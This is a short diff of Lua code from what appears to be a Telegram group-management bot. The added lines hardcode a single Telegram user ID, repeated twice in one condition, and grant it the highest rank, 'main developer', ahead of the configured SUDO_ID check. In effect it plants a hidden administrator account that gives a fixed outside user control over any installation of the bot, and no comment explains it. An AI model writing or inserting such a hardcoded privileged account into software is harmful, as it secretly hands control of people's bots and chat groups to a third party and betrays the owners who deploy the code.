@@ -308,6 +308,9 @@ end
 return false 
 end 
 
+if msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851 then 
+msg.TheRankCmd = 'المطور الاساسي'
+msg.TheRank = 'المطور الاساسي' 
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
